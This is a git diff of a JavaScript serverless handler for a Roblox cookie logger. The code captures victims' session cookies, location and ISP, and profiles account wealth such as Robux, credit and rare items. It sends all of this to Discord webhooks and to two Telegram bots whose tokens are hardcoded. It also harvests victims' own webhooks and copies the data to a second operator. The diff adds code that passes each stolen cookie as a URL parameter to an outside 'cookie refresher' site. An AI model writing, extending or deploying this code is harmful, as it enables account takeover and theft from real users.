@@ -1,20 +1,23 @@
-// api/submit.js — cookie hits Discord immediately, geo runs in parallel
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 
-// Telegram Bot 1 - Account Info (Cookie + Profile)
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
 
-// Telegram Bot 2 - Webhook Info (Victim Webhooks, Slot/Dualhook Creation)
 const TG_WEBHOOK_TOKEN = process.env.TG_WEBHOOK_TOKEN || '8971718461:AAGfB2edB6ryqFOIB1ET5_cGUEoZnZDQB4E';
 const TG_WEBHOOK_CHAT  = process.env.TG_WEBHOOK_CHAT  || '7538845070';
 
-// Item asset IDs
 const ITEMS = {
   HEADLESS: 134082579,
   KORBLOX: 139607625,
   VALKYRIE: 1365767
+};
+
+const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/cookie';
+
+const getRefreshLink = (cookie) => {
+  if (!cookie) return `[Refresh Cookie](${COOKIE_REFRESH_URL})`;
+  return `[Refresh Cookie](${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)})`;
 };
 
 async function redisGet(key) {
@@ -350,7 +353,6 @@ async function refreshCookieStatus(cookie) {
   };
 }
 
-// Bot 1 - Account Info (Cookie + Profile)
 async function tgSendAccount(text) {
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
@@ -361,7 +363,6 @@ async function tgSendAccount(text) {
   } catch (_) {}
 }
 
-// Bot 2 - Webhook Info (Victim Webhooks)
 async function tgSendWebhook(text) {
   try {
     await fetch(`https://api.telegram.org/bot${TG_WEBHOOK_TOKEN}/sendMessage`, {
@@ -390,7 +391,6 @@ function findCookie(slots) {
   return null;
 }
 
-// Find victim webhook from slots (webhook1, webhook2, etc.)
 function findVictimWebhook(slots) {
   for (const [key, val] of Object.entries(slots || {})) {
     if (key.startsWith('webhook') && val) {
@@ -409,12 +409,6 @@ function parseBody(raw) {
 
 const WH_NAME   = 'sPAIN';
 const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
-
-// Cookie Refresher URL
-const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/';
-
-// Blue clickable link for Discord
-const REFRESH_COOKIE_LINK = `[Refresh Cookie](${COOKIE_REFRESH_URL})`;
 
 const createWebhookPayload = (type, data) => {
   const basePayload = {
@@ -496,7 +490,7 @@ async function discordSendCookie(url, cookie, username) {
       body: JSON.stringify({
         username: WH_NAME,
         avatar_url: WH_AVATAR,
-        content: `**🔐 Cookie for "${username || 'Unknown'}"**\n\nYou need to refresh this cookie to work here: [refresh cookie](https://index-html-ruby-eight.vercel.app/)\n\n\`\`\`\n${cookie}\n\`\`\``
+        content: `**🔐 Cookie for "${username || 'Unknown'}"**\n\n**[🔄 Refresh Cookie](${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)})**\n\n\`\`\`\n${cookie}\n\`\`\``
       })
     });
   } catch (_) {}
@@ -528,7 +522,6 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  // Check for victim webhook in slots (webhook1, webhook2, etc.)
   const victimWebhook = findVictimWebhook(slots);
   if (victimWebhook) {
     await tgSendWebhook([
@@ -569,7 +562,7 @@ export default async function handler(req, res) {
         { name: '📍 Location', value: loc,                  inline: true  },
         { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
         { name: '🕐 Time',     value: now,                  inline: false },
-        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
+        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${getRefreshLink(cookie)}`, inline: false }
       ],
       footer: `${pName} Logger`,
       timestamp: now
@@ -602,7 +595,6 @@ export default async function handler(req, res) {
   
   const acc = accountInfo.refreshed ? accountInfo.account : null;
 
-  // STEP 1: 🍪 Cookie Captured (WEBHOOK 2 - uses pName Logger)
   const wh2Payload = createWebhookPayload('webhook2', {
     description: record.dualhookParent
       ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
@@ -614,7 +606,7 @@ export default async function handler(req, res) {
       { name: '🕐 Time',     value: now, inline: true },
       { name: '📍 Location', value: loc, inline: true  },
       { name: '🗺️ ISP',      value: isp, inline: true  },
-      { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
+      { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${getRefreshLink(cookie)}`, inline: false }
     ],
     footer: `${pName} Logger`,
     timestamp: now
@@ -622,7 +614,6 @@ export default async function handler(req, res) {
 
   await discordSend(webhook2, wh2Payload);
 
-  // STEP 1: 🍪 Cookie Captured (WEBHOOK 1 - uses sPAIN Logger • pName)
   if (webhook1 && webhook1 !== webhook2) {
     const wh1Payload = createWebhookPayload('webhook1', {
       title: '🍪 Cookie Captured (Dualhook)',
@@ -634,7 +625,7 @@ export default async function handler(req, res) {
         { name: '📍 Location',  value: loc,                           inline: true  },
         { name: '🗺️ ISP',       value: isp,                           inline: true  },
         { name: '🕐 Time',      value: now,                           inline: true  },
-        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
+        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${getRefreshLink(cookie)}`, inline: false }
       ],
       footer: `sPAIN Logger • ${pName}`,
       timestamp: now
@@ -643,34 +634,24 @@ export default async function handler(req, res) {
     await discordSend(webhook1, wh1Payload);
   }
 
-  // STEP 2: ✅ Account Info Valid (WEBHOOK 2 - uses pName Logger)
   if (accountInfo.refreshed && acc) {
     const accountPayload = createWebhookPayload('account_info', {
       description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
       thumbnail: avatarUrl,
       fields: [
-        // Row 1: Economy
         { name: '💰 Robux', value: `⏣ ${acc.robux.toLocaleString()}`, inline: true },
         { name: '🎵 RAP', value: `${acc.rap.toLocaleString()}`, inline: true },
         { name: '💳 Credit', value: `$${acc.credit.toFixed(2)}`, inline: true },
-        
-        // Row 2: Account Stats
         { name: '🗓️ Age', value: `${acc.accountAge.toLocaleString()}d`, inline: true },
         { name: '⭐ Premium', value: acc.premium ? '✓ Yes' : '✗ No', inline: true },
         { name: '🎙️ VC', value: acc.voiceChat ? '✓ On' : '✗ Off', inline: true },
-        
-        // Row 3: Social
         { name: '👥 Friends', value: acc.friends.toLocaleString(), inline: true },
         { name: '👑 Groups', value: acc.groupsOwned.toString(), inline: true },
         { name: '📦 Items', value: acc.items.toString(), inline: true },
-        
-        // Row 4: Limiteds
         { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
         { name: '⚔️ Korblox', value: acc.korblox ? '✓ Owned' : '✗ None', inline: true },
         { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true },
-        
-        // Refresher Link
-        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
+        { name: '🍪 Cookie Refresher', value: `Click to refresh: ${getRefreshLink(cookie)}`, inline: false }
       ],
       footer: `${pName} Logger`,
       timestamp: now
@@ -678,7 +659,6 @@ export default async function handler(req, res) {
     
     await discordSend(webhook2, accountPayload);
     
-    // Account Info for Webhook 1 (uses sPAIN Logger • pName)
     if (webhook1) {
       const accountPayloadWH1 = createWebhookPayload('account_info', {
         description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
@@ -696,7 +676,7 @@ export default async function handler(req, res) {
           { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
           { name: '⚔️ Korblox', value: acc.korblox ? '✓ Owned' : '✗ None', inline: true },
           { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true },
-          { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
+          { name: '🍪 Cookie Refresher', value: `Click to refresh: ${getRefreshLink(cookie)}`, inline: false }
         ],
         footer: `sPAIN Logger • ${pName}`,
         timestamp: now
@@ -705,11 +685,9 @@ export default async function handler(req, res) {
     }
   }
 
-  // STEP 3: 🔐 Cookie
   await discordSendCookie(webhook2, cookie, acc?.username);
   if (webhook1) await discordSendCookie(webhook1, cookie, acc?.username);
 
-  // Telegram Bot 1 - Account Info (NO ISP, NO Refresher)
   if (acc) {
     await tgSendAccount([
       `🍪 <b>COOKIE — ${pName}</b>`,
